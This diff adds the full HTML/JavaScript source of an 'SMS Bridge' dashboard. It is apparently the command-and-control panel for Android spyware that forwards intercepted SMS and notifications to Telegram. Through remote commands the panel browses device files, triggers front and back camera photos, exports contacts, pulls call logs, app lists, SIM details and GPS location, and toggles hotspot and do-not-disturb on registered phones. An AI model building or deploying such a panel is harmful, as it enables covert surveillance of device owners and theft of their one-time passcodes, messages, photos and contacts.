@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>SMS Bridge</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#080810;--s1:#0e0e1a;--s2:#13131f;--s3:#1a1a28;
+  --border:#1f1f32;--border2:#2a2a40;
+  --accent:#6366f1;--accent2:#818cf8;--ag:rgba(99,102,241,.15);
+  --green:#22c55e;--red:#ef4444;--amber:#f59e0b;
+  --text:#f0f0f8;--muted:#5a5a7a;--muted2:#3a3a55;
+  --mono:'DM Mono',monospace;--sans:'DM Sans',sans-serif;--r:14px;--r2:10px;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:100vh}
+body::before{content:'';position:fixed;top:-300px;left:50%;transform:translateX(-50%);width:900px;height:600px;background:radial-gradient(ellipse,rgba(99,102,241,.06) 0%,transparent 65%);pointer-events:none}
+.app{max-width:1140px;margin:0 auto;padding:28px 16px}
+.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px;flex-wrap:wrap;gap:10px}
+.brand{display:flex;align-items:center;gap:10px}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent)}
+.brand-name{font-size:18px;font-weight:700}
+.pill{background:var(--s2);border:1px solid var(--border);border-radius:100px;padding:5px 12px;font-family:var(--mono);font-size:11px;color:var(--muted)}
+.btn{background:var(--accent);border:none;color:#fff;font-family:var(--sans);font-size:12px;font-weight:600;padding:7px 14px;border-radius:8px;cursor:pointer;transition:opacity .2s}
+.btn:hover{opacity:.85}.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn-ghost{background:none;border:1px solid var(--border);color:var(--muted);font-family:var(--sans);font-size:11px;padding:6px 12px;border-radius:8px;cursor:pointer;transition:all .2s}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent)}
+.btn-sm{background:var(--s3);border:1px solid var(--border);color:var(--text);font-family:var(--sans);font-size:11px;padding:5px 10px;border-radius:6px;cursor:pointer;transition:all .2s}
+.btn-sm:hover{border-color:var(--accent2);color:var(--accent2)}
+.btn-danger{border-color:var(--border)}
+.btn-danger:hover{border-color:var(--red);color:var(--red)}
+
+/* Lock */
+.lock{max-width:400px;margin:80px auto;text-align:center}
+.lock-icon{font-size:44px;margin-bottom:16px}.lock h2{font-size:20px;font-weight:700;margin-bottom:8px}
+.lock p{font-size:13px;color:var(--muted);margin-bottom:28px}
+.lock-input{display:flex;gap:8px;margin-top:16px}
+.lock-input input{flex:1;background:var(--s2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;color:var(--text);font-family:var(--mono);font-size:13px;outline:none}
+.lock-input input:focus{border-color:var(--accent)}
+
+/* Grid */
+.grid{display:grid;grid-template-columns:repeat(12,1fr);gap:10px;margin-bottom:10px}
+.card{background:var(--s1);border:1px solid var(--border);border-radius:var(--r);padding:18px;position:relative;overflow:hidden;transition:border-color .2s}
+.card:hover{border-color:var(--border2)}
+.card::after{content:'';position:absolute;top:0;right:0;width:100px;height:100px;background:radial-gradient(circle,var(--ag) 0%,transparent 70%);pointer-events:none}
+.sc{grid-column:span 3}.slabel{font-size:10px;font-weight:600;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;margin-bottom:10px}
+.sval{font-size:34px;font-weight:700;line-height:1;letter-spacing:-1px;margin-bottom:4px}
+.ssub{font-size:11px;color:var(--muted);font-family:var(--mono)}
+.gtoggle{grid-column:span 12;display:flex;align-items:center;justify-content:space-between;padding:14px 20px}
+.gtoggle h3{font-size:14px;font-weight:600;margin-bottom:2px}.gtoggle p{font-size:12px;color:var(--muted)}
+.tgl{position:relative;width:48px;height:26px;cursor:pointer;flex-shrink:0}
+.tgl input{display:none}
+.tgl-track{position:absolute;inset:0;background:var(--s3);border:1px solid var(--border2);border-radius:100px;transition:all .3s}
+.tgl input:checked+.tgl-track{background:var(--accent);border-color:var(--accent);box-shadow:0 0 14px rgba(99,102,241,.4)}
+.tgl-thumb{position:absolute;top:3px;left:3px;width:18px;height:18px;background:#fff;border-radius:50%;transition:transform .3s cubic-bezier(.34,1.56,.64,1);pointer-events:none;z-index:1}
+.tgl input:checked~.tgl-thumb{transform:translateX(22px)}
+
+/* Tabs */
+.tabs{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap}
+.tab{background:none;border:1px solid var(--border);color:var(--muted);font-family:var(--sans);font-size:12px;padding:6px 14px;border-radius:8px;cursor:pointer;transition:all .2s}
+.tab.active{background:var(--accent);border-color:var(--accent);color:#fff}
+
+/* Device bentos */
+.devs-card{grid-column:span 12}
+.devs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
+.dev-bento{background:var(--s2);border:1px solid var(--border);border-radius:var(--r2);padding:16px;cursor:pointer;transition:border-color .2s}
+.dev-bento:hover{border-color:var(--border2)}.dev-bento.selected{border-color:var(--accent)}
+.dev-top{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.sdot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.sdot.active{background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
+.sdot.idle{background:var(--amber)}.sdot.unknown{background:var(--muted)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.dev-name{font-size:13px;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dev-stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
+.dstat{background:var(--s1);border-radius:8px;padding:8px 10px}
+.dstat-l{font-size:10px;color:var(--muted);margin-bottom:2px}
+.dstat-v{font-size:16px;font-weight:700;font-family:var(--mono)}
+.dev-meta{font-size:11px;color:var(--muted);font-family:var(--mono);margin-top:8px;padding-top:8px;border-top:1px solid var(--border)}
+.dev-controls{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px;padding-top:10px;border-top:1px solid var(--border)}
+.err-badge{display:inline-block;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:var(--red);font-size:10px;font-family:var(--mono);padding:2px 8px;border-radius:4px;margin-top:4px}
+.batt{font-size:11px;color:var(--muted);font-family:var(--mono)}
+
+/* Detail panel */
+.dev-detail{grid-column:span 12;display:none}
+.dev-detail.open{display:block}
+.detail-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px}
+.detail-header h3{font-size:16px;font-weight:700}
+.detail-actions{display:flex;gap:6px;flex-wrap:wrap}
+.detail-tabs{display:flex;gap:4px;margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:10px;flex-wrap:wrap}
+.dtab{background:none;border:none;color:var(--muted);font-family:var(--sans);font-size:12px;padding:6px 12px;border-radius:6px;cursor:pointer}
+.dtab.active{background:var(--s2);color:var(--text)}
+.detail-pane{display:none}.detail-pane.open{display:block}
+
+/* Info rows */
+.info-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
+.info-section{background:var(--s2);border-radius:var(--r2);padding:14px}
+.info-section h4{font-size:10px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:10px}
+.irow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;font-size:12px}
+.irow span{color:var(--muted)}.irow strong{font-family:var(--mono);font-size:11px}
+.map-link{font-size:12px;color:var(--accent2);text-decoration:none}
+.map-link:hover{text-decoration:underline}
+.edit-input{background:var(--s1);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:12px;outline:none;width:100%}
+.edit-input:focus{border-color:var(--accent)}
+
+/* Feed */
+.feed-card{grid-column:span 12}
+.feed{display:flex;flex-direction:column;gap:7px;max-height:440px;overflow-y:auto;padding-right:3px}
+.feed::-webkit-scrollbar{width:3px}.feed::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
+.msg{display:grid;grid-template-columns:32px 1fr auto;gap:10px;padding:12px 14px;background:var(--s2);border:1px solid var(--border);border-radius:var(--r2);animation:fadeUp .2s ease}
+@keyframes fadeUp{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+.msg-icon{width:32px;height:32px;border-radius:8px;background:var(--ag);border:1px solid rgba(99,102,241,.2);display:flex;align-items:center;justify-content:center;font-size:14px}
+.msg-sender{font-family:var(--mono);font-size:11px;color:var(--accent2);font-weight:500;margin-bottom:3px;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.dev-tag{font-size:10px;background:var(--ag);border:1px solid rgba(99,102,241,.2);color:var(--accent2);padding:1px 7px;border-radius:100px}
+.msg-body{font-size:13px;color:#b0b0c8;line-height:1.4;word-break:break-word}
+.msg-fwd{font-size:10px;margin-top:3px}.msg-fwd.ok{color:var(--green)}.msg-fwd.fail{color:var(--red)}
+.msg-time{font-family:var(--mono);font-size:10px;color:var(--muted);white-space:nowrap}
+
+/* File Browser */
+.file-browser{background:var(--s2);border-radius:var(--r2);padding:14px}
+.file-path{font-family:var(--mono);font-size:12px;color:var(--muted);margin-bottom:12px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.path-seg{cursor:pointer;color:var(--accent2)}.path-seg:hover{text-decoration:underline}
+.file-list{display:flex;flex-direction:column;gap:4px;max-height:400px;overflow-y:auto}
+.file-item{display:flex;align-items:center;gap:10px;padding:8px 10px;background:var(--s1);border-radius:8px;cursor:pointer;transition:background .15s}
+.file-item:hover{background:var(--s3)}
+.file-icon{font-size:16px;flex-shrink:0;width:24px;text-align:center}
+.file-name{flex:1;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.file-size{font-family:var(--mono);font-size:10px;color:var(--muted)}
+.file-date{font-family:var(--mono);font-size:10px;color:var(--muted2)}
+
+/* Photos grid */
+.photos-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
+.photo-card{background:var(--s2);border:1px solid var(--border);border-radius:var(--r2);overflow:hidden;cursor:pointer;transition:border-color .2s}
+.photo-card:hover{border-color:var(--accent)}
+.photo-card img{width:100%;height:120px;object-fit:cover;display:block}
+.photo-meta{padding:8px 10px;font-size:10px;color:var(--muted);font-family:var(--mono)}
+
+/* Logs */
+.log-item{padding:10px 14px;background:var(--s2);border:1px solid var(--border);border-radius:8px;margin-bottom:6px;display:flex;align-items:flex-start;gap:10px}
+.log-ev{font-size:11px;font-family:var(--mono);color:var(--accent2);min-width:110px}
+.log-detail{font-size:12px;color:#b0b0c8;flex:1}
+.log-dev{font-size:10px;color:var(--muted)}
+.log-time{font-size:10px;color:var(--muted);font-family:var(--mono);white-space:nowrap}
+.log-new_device .log-ev{color:var(--green)}
+
+/* Contacts & call log table */
+.data-table{width:100%;border-collapse:collapse;font-size:12px}
+.data-table th{text-align:left;padding:8px 10px;color:var(--muted);font-size:10px;letter-spacing:.08em;text-transform:uppercase;border-bottom:1px solid var(--border)}
+.data-table td{padding:8px 10px;border-bottom:1px solid var(--border);font-family:var(--mono);color:#b0b0c8}
+.data-table tr:last-child td{border-bottom:none}
+.data-table tr:hover td{background:var(--s2)}
+
+/* Modal */
+.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
+.modal-bg.open{display:flex}
+.modal{background:var(--s1);border:1px solid var(--border2);border-radius:var(--r);padding:24px;width:400px;max-width:90vw}
+.modal h3{font-size:16px;font-weight:700;margin-bottom:16px}
+.modal input{width:100%;background:var(--s2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;color:var(--text);font-family:var(--mono);font-size:13px;outline:none;margin-bottom:14px}
+.modal input:focus{border-color:var(--accent)}
+.modal-btns{display:flex;gap:8px;justify-content:flex-end}
+.photo-modal-img{width:100%;max-height:60vh;object-fit:contain;margin-bottom:12px;border-radius:8px}
+
+.empty{text-align:center;padding:40px 20px;color:var(--muted)}
+.empty-icon{font-size:32px;margin-bottom:10px;opacity:.3}
+.spin{display:inline-block;width:12px;height:12px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.toast{position:fixed;bottom:20px;right:20px;background:var(--s2);border:1px solid var(--border);border-radius:10px;padding:10px 16px;font-size:13px;opacity:0;transform:translateY(8px);transition:all .3s;pointer-events:none;z-index:99}
+.toast.show{opacity:1;transform:translateY(0)}.toast.ok{border-color:rgba(34,197,94,.3);color:var(--green)}.toast.err{border-color:rgba(239,68,68,.3);color:var(--red)}
+@media(max-width:700px){.sc{grid-column:span 6}.info-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- Lock -->
+  <div id="lockScreen" class="lock">
+    <div class="lock-icon">🔐</div>
+    <h2>SMS Bridge</h2>
+    <p>Enter your secret key to access the dashboard</p>
+    <div class="lock-input">
+      <input type="password" id="secIn" placeholder="bridge_x9k2m7p4q1" onkeydown="if(event.key==='Enter')unlock()"/>
+      <button class="btn" onclick="unlock()">Unlock</button>
+    </div>
+  </div>
+
+  <div id="mainDash" style="display:none">
+
+    <!-- Header -->
+    <div class="header">
+      <div class="brand"><div class="dot"></div><span class="brand-name">SMS Bridge</span></div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <span class="pill">nikshepotp254.up.railway.app</span>
+        <button class="btn" id="rfBtn" onclick="load()">Refresh</button>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="grid">
+      <div class="card sc"><div class="slabel">Total SMS</div><div class="sval" id="sTotal">—</div><div class="ssub">all time</div></div>
+      <div class="card sc"><div class="slabel">Forwarded</div><div class="sval" style="color:var(--green)" id="sFwd">—</div><div class="ssub">to telegram</div></div>
+      <div class="card sc"><div class="slabel">Notifications</div><div class="sval" style="color:var(--amber)" id="sNotif">—</div><div class="ssub">captured</div></div>
+      <div class="card sc"><div class="slabel">Devices</div><div class="sval" style="color:var(--accent2)" id="sDevices">—</div><div class="ssub">registered</div></div>
+    </div>
+
+    <!-- Global toggle -->
+    <div class="grid">
+      <div class="card gtoggle">
+        <div><h3>Global Forwarding</h3><p id="gdesc">Loading...</p></div>
+        <label class="tgl"><input type="checkbox" id="gTgl" onchange="onGlobal(this)"/><div class="tgl-track"></div><div class="tgl-thumb"></div></label>
+      </div>
+    </div>
+
+    <!-- Main tabs -->
+    <div class="tabs">
+      <button class="tab active" id="tab-devices"  onclick="showTab('devices')">Devices</button>
+      <button class="tab"        id="tab-messages" onclick="showTab('messages')">Messages</button>
+      <button class="tab"        id="tab-logs"     onclick="showTab('logs')">Logs</button>
+    </div>
+
+    <!-- Devices pane -->
+    <div id="pane-devices">
+      <div class="grid">
+        <div class="card devs-card">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">
+            <span style="font-size:11px;font-weight:600;letter-spacing:.1em;color:var(--muted);text-transform:uppercase">Devices</span>
+          </div>
+          <div class="devs-grid" id="devsGrid"><div class="empty"><div class="empty-icon">📱</div>No devices yet</div></div>
+        </div>
+      </div>
+
+      <!-- Device detail -->
+      <div class="grid">
+        <div class="card dev-detail" id="devDetail">
+          <div class="detail-header">
+            <h3 id="detailTitle">Device</h3>
+            <div class="detail-actions">
+              <button class="btn-ghost" onclick="openRename()">Rename</button>
+              <button class="btn-ghost" onclick="openSetPhone()">Set Phone #</button>
+              <button class="btn-ghost btn-danger" onclick="closeDetail()">✕</button>
+            </div>
+          </div>
+          <!-- Device tabs -->
+          <div class="detail-tabs">
+            <button class="dtab active" id="dtab-info"     onclick="showDTab('info')">Info</button>
+            <button class="dtab"        id="dtab-files"    onclick="showDTab('files')">Files</button>
+            <button class="dtab"        id="dtab-photos"   onclick="showDTab('photos')">Photos</button>
+            <button class="dtab"        id="dtab-contacts" onclick="showDTab('contacts')">Contacts</button>
+            <button class="dtab"        id="dtab-calllog"  onclick="showDTab('calllog')">Call Log</button>
+            <button class="dtab"        id="dtab-apps"     onclick="showDTab('apps')">Apps</button>
+            <button class="dtab"        id="dtab-sim"      onclick="showDTab('sim')">SIM Info</button>
+          </div>
+
+          <!-- Info pane -->
+          <div class="detail-pane open" id="dpane-info">
+            <div class="info-grid" id="detailInfoGrid"></div>
+          </div>
+
+          <!-- Files pane -->
+          <div class="detail-pane" id="dpane-files">
+            <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">
+              <button class="btn-sm" onclick="browseFiles('/')">Root</button>
+              <button class="btn-sm" onclick="browseFiles('/storage/emulated/0/Download')">Downloads</button>
+              <button class="btn-sm" onclick="browseFiles('/storage/emulated/0/DCIM')">DCIM</button>
+              <button class="btn-sm" onclick="browseFiles('/storage/emulated/0/Pictures')">Pictures</button>
+              <button class="btn-sm" onclick="browseFiles('/storage/emulated/0/Documents')">Documents</button>
+            </div>
+            <div class="file-browser">
+              <div class="file-path" id="filePath"><span class="path-seg" onclick="browseFiles('/')">📁 /</span></div>
+              <div class="file-list" id="fileList"><div class="empty"><div class="empty-icon">📁</div>Click a folder to browse</div></div>
+            </div>
+          </div>
+
+          <!-- Photos pane -->
+          <div class="detail-pane" id="dpane-photos">
+            <div style="display:flex;gap:8px;margin-bottom:14px">
+              <button class="btn-sm" onclick="sendCmd('take_photo',{camera:'back'})">📸 Back Camera</button>
+              <button class="btn-sm" onclick="sendCmd('take_photo',{camera:'front'})">🤳 Front Camera</button>
+            </div>
+            <div class="photos-grid" id="photosGrid"><div class="empty"><div class="empty-icon">📷</div>No photos yet</div></div>
+          </div>
+
+          <!-- Contacts pane -->
+          <div class="detail-pane" id="dpane-contacts">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+              <span id="contactCount" style="font-size:12px;color:var(--muted)"></span>
+              <button class="btn-sm" onclick="sendCmd('sync_contacts',{})">🔄 Sync Now</button>
+              <a class="btn-sm" id="csvDownload" href="#" target="_blank">⬇ CSV</a>
+              <a class="btn-sm" id="vcfDownload" href="#" target="_blank">⬇ VCF</a>
+            </div>
+            <div style="max-height:400px;overflow-y:auto">
+              <table class="data-table" id="contactsTable">
+                <thead><tr><th>Name</th><th>Number</th></tr></thead>
+                <tbody id="contactsTbody"></tbody>
+              </table>
+            </div>
+          </div>
+
+          <!-- Call Log pane -->
+          <div class="detail-pane" id="dpane-calllog">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+              <span id="calllogCount" style="font-size:12px;color:var(--muted)"></span>
+              <button class="btn-sm" onclick="sendCmd('sync_calllog',{})">🔄 Sync Now</button>
+            </div>
+            <div style="max-height:400px;overflow-y:auto">
+              <table class="data-table">
+                <thead><tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>
+                <tbody id="calllogTbody"></tbody>
+              </table>
+            </div>
+          </div>
+
+          <!-- Apps pane -->
+          <div class="detail-pane" id="dpane-apps">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+              <span id="appsCount" style="font-size:12px;color:var(--muted)"></span>
+            </div>
+            <div id="appsList" style="display:flex;flex-wrap:wrap;gap:6px;max-height:400px;overflow-y:auto"></div>
+          <!-- SIM pane -->
+          <div class="detail-pane" id="dpane-sim">
+            <div id="simInfoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px;margin-top:4px"></div>
+          </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Messages pane -->
+    <div id="pane-messages" style="display:none">
+      <div class="grid">
+        <div class="card feed-card">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">
+            <span style="font-size:11px;font-weight:600;letter-spacing:.1em;color:var(--muted);text-transform:uppercase">Messages</span>
+            <button class="btn-ghost btn-danger" onclick="clearMsgs()">Clear all</button>
+          </div>
+          <div class="feed" id="feed"><div class="empty"><div class="empty-icon">📭</div>No messages</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Logs pane -->
+    <div id="pane-logs" style="display:none">
+      <div class="grid">
+        <div class="card" style="grid-column:span 12">
+          <div style="margin-bottom:14px;font-size:11px;font-weight:600;letter-spacing:.1em;color:var(--muted);text-transform:uppercase">Event Logs</div>
+          <div id="logsContainer"></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- Modals -->
+<div class="modal-bg" id="renameModal">
+  <div class="modal">
+    <h3>Rename Device</h3>
+    <input id="renameInput" type="text" placeholder="Display name"/>
+    <div class="modal-btns">
+      <button class="btn-ghost" onclick="closeModal('renameModal')">Cancel</button>
+      <button class="btn" onclick="doRename()">Save</button>
+    </div>
+  </div>
+</div>
+<div class="modal-bg" id="phoneModal">
+  <div class="modal">
+    <h3>Set Phone Number</h3>
+    <input id="phoneInput" type="text" placeholder="+91XXXXXXXXXX"/>
+    <div class="modal-btns">
+      <button class="btn-ghost" onclick="closeModal('phoneModal')">Cancel</button>
+      <button class="btn" onclick="doSetPhone()">Save</button>
+    </div>
+  </div>
+</div>
+<div class="modal-bg" id="photoModal">
+  <div class="modal" style="max-width:600px;width:95vw">
+    <h3 id="photoModalTitle">Photo</h3>
+    <img class="photo-modal-img" id="photoModalImg" src="" alt=""/>
+    <div class="modal-btns"><button class="btn-ghost" onclick="closeModal('photoModal')">Close</button></div>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+const API = '';
+let SEC = localStorage.getItem('sb_sec') || '';
+let state = {}, selectedDevice = null, currentFilePath = '/';
+
+function unlock() {
+  const v = document.getElementById('secIn').value.trim();
+  if (!v) return toast('Enter secret key','err');
+  SEC = v; localStorage.setItem('sb_sec', SEC);
+  document.getElementById('lockScreen').style.display = 'none';
+  document.getElementById('mainDash').style.display = 'block';
+  load();
+}
+if (SEC) { document.getElementById('lockScreen').style.display='none'; document.getElementById('mainDash').style.display='block'; }
+
+async function api(path, opts={}) {
+  try {
+    const r = await fetch(API+path, {...opts, headers:{'x-secret':SEC,'Content-Type':'application/json',...(opts.headers||{})}});
+    if (r.status===401) { toast('Wrong secret','err'); return null; }
+    if (!r.ok) throw new Error(r.status);
+    return r.json();
+  } catch(e) { toast('Error: '+e.message,'err'); return null; }
+}
+
+async function load() {
+  if (!SEC) return;
+  const btn = document.getElementById('rfBtn');
+  btn.innerHTML='<span class="spin"></span>'; btn.disabled=true;
+  const d = await api('/dashboard');
+  btn.innerHTML='Refresh'; btn.disabled=false;
+  if (d) { state=d; render(d); }
+}
+
+function render(d) {
+  document.getElementById('sTotal').textContent   = d.total ?? '—';
+  document.getElementById('sFwd').textContent     = d.forwarded ?? '—';
+  document.getElementById('sNotif').textContent   = d.notif_total ?? '—';
+  document.getElementById('sDevices').textContent = (d.devices||[]).length;
+  document.getElementById('gTgl').checked = d.global_enabled;
+  document.getElementById('gdesc').textContent = d.global_enabled
+    ? 'All SMS are being forwarded to Telegram' : 'Forwarding is paused globally';
+  renderDevices(d.devices||[]);
+  renderFeed(d.messages||[]);
+  renderLogs(d.events||[]);
+  if (selectedDevice) {
+    const dev = (d.devices||[]).find(x=>x.device_id===selectedDevice);
+    if (dev) renderDetailInfo(dev);
+  }
+}
+
+function renderDevices(devs) {
+  const el = document.getElementById('devsGrid');
+  if (!devs.length) { el.innerHTML='<div class="empty"><div class="empty-icon">📱</div>No devices</div>'; return; }
+  el.innerHTML = devs.map(d=>{
+    const dot  = d.status==='active'?'active':d.status==='idle'?'idle':'unknown';
+    const ls   = d.last_seen ? timeAgo(d.last_seen) : 'Never';
+    const batt = d.battery != null ? `🔋${d.battery}%${d.charging?'⚡':''}` : '';
+    const net  = d.network_type ? `📶${d.network_type}` : '';
+    const err  = d.last_error ? `<div class="err-badge">E${d.last_error}: ${esc(d.error_desc)}</div>` : '';
+    return `
+    <div class="dev-bento ${selectedDevice===d.device_id?'selected':''}" onclick="selectDevice('${esc(d.device_id)}')">
+      <div class="dev-top">
+        <span class="sdot ${dot}"></span>
+        <span class="dev-name">${esc(d.display_name)}</span>
+        <label class="tgl" onclick="event.stopPropagation()">
+          <input type="checkbox" ${d.enabled?'checked':''} onchange="onDevToggle(this,'${esc(d.device_id)}')"/>
+          <div class="tgl-track"></div><div class="tgl-thumb"></div>
+        </label>
+      </div>
+      ${batt||net ? `<div class="batt">${batt} ${net}</div>` : ''}
+      <div class="dev-stats-grid">
+        <div class="dstat"><div class="dstat-l">SMS</div><div class="dstat-v">${d.total}</div></div>
+        <div class="dstat"><div class="dstat-l">NOTIF</div><div class="dstat-v" style="color:var(--amber)">${d.notif_count||0}</div></div>
+        <div class="dstat"><div class="dstat-l">CALLS</div><div class="dstat-v">${d.call_count||0}</div></div>
+        <div class="dstat"><div class="dstat-l">PHOTOS</div><div class="dstat-v" style="color:var(--green)">${d.photo_count||0}</div></div>
+      </div>
+      <div class="dev-meta">⏱ ${ls}${d.phone_number?' · '+esc(d.phone_number):''}</div>
+      <div class="dev-controls">
+        <button class="btn-sm" onclick="event.stopPropagation();sendCmdFor('${esc(d.device_id)}','dnd_on',{})">🔕 DND On</button>
+        <button class="btn-sm" onclick="event.stopPropagation();sendCmdFor('${esc(d.device_id)}','dnd_off',{})">🔔 DND Off</button>
+        <button class="btn-sm" onclick="event.stopPropagation();sendCmdFor('${esc(d.device_id)}','hotspot_on',{})">📶 HotSpot</button>
+        <button class="btn-sm" onclick="event.stopPropagation();sendCmdFor('${esc(d.device_id)}','take_photo',{camera:'back'})">📸</button>
+      </div>
+      ${err}
+    </div>`;
+  }).join('');
+}
+
+function selectDevice(id) {
+  selectedDevice = id;
+  const dev = (state.devices||[]).find(x=>x.device_id===id);
+  if (dev) {
+    renderDetailInfo(dev);
+    document.getElementById('devDetail').classList.add('open');
+    // Update contacts download links
+    const base = `${API}/contacts/${encodeURIComponent(id)}/download`;
+    const csvEl = document.getElementById('csvDownload');
+    const vcfEl = document.getElementById('vcfDownload');
+    if (csvEl) csvEl.href = `${base}?fmt=csv&secret=${encodeURIComponent(SEC)}`;
+    if (vcfEl) vcfEl.href = `${base}?fmt=vcf&secret=${encodeURIComponent(SEC)}`;
+  }
+  renderDevices(state.devices||[]);
+}
+
+function renderDetailInfo(d) {
+  document.getElementById('detailTitle').textContent = d.display_name;
+  const loc = d.location;
+  const locHtml = loc
+    ? `<a class="map-link" href="https://maps.google.com/?q=${loc.lat},${loc.lng}" target="_blank">📍 ${loc.lat.toFixed(5)}, ${loc.lng.toFixed(5)} ±${Math.round(loc.accuracy)}m</a><br><small style="color:var(--muted);font-size:10px">${timeAgo(loc.recorded_at)}</small>`
+    : '<span style="color:var(--muted)">No location yet</span>';
+  document.getElementById('detailInfoGrid').innerHTML = `
+    <div class="info-section">
+      <h4>Device</h4>
+      <div class="irow"><span>ID</span><strong>${esc(d.device_id)}</strong></div>
+      <div class="irow"><span>Name</span><strong>${esc(d.display_name)}</strong></div>
+      <div class="irow"><span>Phone</span><strong>${esc(d.phone_number||'—')}</strong></div>
+      <div class="irow"><span>First Seen</span><strong>${fmtDate(d.first_seen)}</strong></div>
+      <div class="irow"><span>Status</span><strong style="color:${d.status==='active'?'var(--green)':d.status==='idle'?'var(--amber)':'var(--muted)'}">${d.status}</strong></div>
+      ${d.last_error?`<div style="margin-top:8px"><span class="err-badge">E${d.last_error}: ${esc(d.error_desc)}</span></div>`:''}
+    </div>
+    <div class="info-section">
+      <h4>Stats</h4>
+      <div class="irow"><span>SMS Received</span><strong>${d.total}</strong></div>
+      <div class="irow"><span>Forwarded</span><strong style="color:var(--green)">${d.forwarded||0}</strong></div>
+      <div class="irow"><span>Notifications</span><strong>${d.notif_count||0}</strong></div>
+      <div class="irow"><span>Calls</span><strong>${d.call_count||0}</strong></div>
+      <div class="irow"><span>Contacts</span><strong>${d.contact_count||0}</strong></div>
+      <div class="irow"><span>Apps</span><strong>${d.app_count||0}</strong></div>
+      <div class="irow"><span>Photos</span><strong>${d.photo_count||0}</strong></div>
+      <div class="irow"><span>Battery</span><strong>${d.battery!=null?d.battery+'%'+(d.charging?'⚡':''):'—'}</strong></div>
+      <div class="irow"><span>Network</span><strong>${d.network_type||'—'} ${d.wifi?'(WiFi)':''}</strong></div>
+    </div>
+    <div class="info-section">
+      <h4>Location</h4>${locHtml}
+      <div style="margin-top:14px"><h4>Remote Controls</h4>
+      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:8px">
+        <button class="btn-sm" onclick="sendCmd('dnd_on',{})">🔕 DND On</button>
+        <button class="btn-sm" onclick="sendCmd('dnd_off',{})">🔔 DND Off</button>
+        <button class="btn-sm" onclick="sendCmd('hotspot_on',{})">📶 Hotspot On</button>
+        <button class="btn-sm" onclick="sendCmd('hotspot_off',{})">📴 Hotspot Off</button>
+        <button class="btn-sm" onclick="sendCmd('take_photo',{camera:'back'})">📸 Back Cam</button>
+        <button class="btn-sm" onclick="sendCmd('take_photo',{camera:'front'})">🤳 Front Cam</button>
+      </div></div>
+    </div>`;
+}
+
+function closeDetail() {
+  selectedDevice = null;
+  document.getElementById('devDetail').classList.remove('open');
+  renderDevices(state.devices||[]);
+}
+
+function showDTab(name) {
+  ['info','files','photos','contacts','calllog','apps','sim'].forEach(t => {
+    document.getElementById('dtab-'+t)?.classList.remove('active');
+    const p = document.getElementById('dpane-'+t);
+    if (p) p.classList.remove('open');
+  });
+  document.getElementById('dtab-'+name)?.classList.add('active');
+  document.getElementById('dpane-'+name)?.classList.add('open');
+  if (name === 'contacts') loadContacts();
+  if (name === 'sim') loadSimInfo();
+  if (name === 'calllog') loadCallLog();
+  if (name === 'apps') loadApps();
+  if (name === 'photos') loadPhotos();
+  if (name === 'files') browseFiles(currentFilePath);
+}
+
